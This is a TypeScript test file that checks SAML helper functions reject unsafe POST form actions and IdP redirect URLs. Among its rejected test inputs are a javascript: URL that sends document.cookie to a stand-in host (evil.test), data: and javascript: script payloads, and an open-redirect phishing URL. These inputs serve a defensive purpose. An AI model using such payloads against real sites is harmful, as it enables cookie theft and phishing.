import { APIError } from "better-auth/api";
import { describe, expect, it } from "vitest";
import type { SAMLConfig } from "../types";
import {
	assertAllowedIdPSSORedirectURL,
	createSAMLPostForm,
	resolveSPEntityID,
} from "./helpers";

const invalidSAMLBindingLocationMessage =
	"SAML POST binding location must be an absolute http or https URL";

function expectInvalidSAMLBindingLocation(action: string) {
	try {
		createSAMLPostForm(action, "SAMLResponse", "base64value");
		expect.unreachable();
	} catch (error) {
		expect(error).toBeInstanceOf(APIError);
		expect(error).toMatchObject({
			status: "BAD_REQUEST",
			statusCode: 400,
			message: invalidSAMLBindingLocationMessage,
			body: {
				message: invalidSAMLBindingLocationMessage,
			},
		});
	}
}

describe("createSAMLPostForm", () => {
	it("emits an http(s) form action", async () => {
		const res = createSAMLPostForm(
			"https://idp.example.com/slo",
			"SAMLResponse",
			"base64value",
		);
		const html = await res.text();
		expect(html).toContain('action="https://idp.example.com/slo"');
	});

	it("rejects a javascript: form action", () => {
		expectInvalidSAMLBindingLocation(
			"javascript:fetch('https://evil.test/x?c='+document.cookie)",
		);
	});

	it("rejects a data: form action", () => {
		expectInvalidSAMLBindingLocation("data:text/html,<script>1</script>");
	});
});

describe("resolveSPEntityID", () => {
	const base = (): SAMLConfig => ({
		issuer: "https://issuer.example",
		entryPoint: "https://idp.example/sso",
		cert: "CERT",
		callbackUrl: "https://sp.example/acs",
		spMetadata: {},
	});

	it("prefers explicit spMetadata.entityID", () => {
		const config = base();
		config.spMetadata = { entityID: "https://sp.example/explicit" };
		expect(resolveSPEntityID(config)).toBe("https://sp.example/explicit");
	});

	it("reads entityID from spMetadata.metadata XML when entityID field is absent", () => {
		const config = base();
		config.spMetadata = {
			metadata: `<EntityDescriptor entityID="https://sp.example/from-metadata" xmlns="urn:oasis:names:tc:SAML:2.0:metadata"><SPSSODescriptor/></EntityDescriptor>`,
		};
		expect(resolveSPEntityID(config)).toBe("https://sp.example/from-metadata");
	});

	it("falls back to issuer", () => {
		expect(resolveSPEntityID(base())).toBe("https://issuer.example");
	});
});

describe("assertAllowedIdPSSORedirectURL", () => {
	const config = (): SAMLConfig => ({
		issuer: "https://sp.example",
		entryPoint: "https://idp.example.com/sso",
		cert: "CERT",
		callbackUrl: "https://sp.example/acs",
		spMetadata: {},
		idpMetadata: {
			singleSignOnService: [
				{
					Binding: "urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect",
					Location: "https://idp.example.com/sso",
				},
			],
		},
	});

	it("allows redirect to configured IdP SSO with SAMLRequest query", () => {
		expect(() =>
			assertAllowedIdPSSORedirectURL(
				"https://idp.example.com/sso?SAMLRequest=abc&RelayState=x",
				config(),
			),
		).not.toThrow();
	});

	it("rejects open redirect to unrelated host", () => {
		expect(() =>
			assertAllowedIdPSSORedirectURL(
				"https://evil.example/phish?SAMLRequest=abc",
				config(),
			),
		).toThrow(/Invalid SAML request/);
	});

	it("rejects URL with fragment", () => {
		expect(() =>
			assertAllowedIdPSSORedirectURL(
				"https://idp.example.com/sso?SAMLRequest=abc#frag",
				config(),
			),
		).toThrow(/Invalid SAML request/);
	});

	it("rejects pathname prefix sibling (sso-evil)", () => {
		expect(() =>
			assertAllowedIdPSSORedirectURL(
				"https://idp.example.com/sso-evil?SAMLRequest=abc",
				config(),
			),
		).toThrow(/Invalid SAML request/);
	});

	it("rejects invalid URL", () => {
		expect(() => assertAllowedIdPSSORedirectURL("not-a-url", config())).toThrow(
			/Invalid SAML request/,
		);
	});

	it("rejects non-http(s) protocol", () => {
		expect(() =>
			assertAllowedIdPSSORedirectURL("javascript:alert(1)", config()),
		).toThrow(/Invalid SAML request/);
	});

	it("rejects when no IdP SSO locations configured", () => {
		const bare: SAMLConfig = {
			issuer: "https://sp.example",
			entryPoint: "",
			cert: "CERT",
			callbackUrl: "https://sp.example/acs",
			spMetadata: {},
		};
		expect(() =>
			assertAllowedIdPSSORedirectURL(
				"https://idp.example.com/sso?SAMLRequest=abc",
				bare,
			),
		).toThrow(/Invalid SAML request/);
	});
});
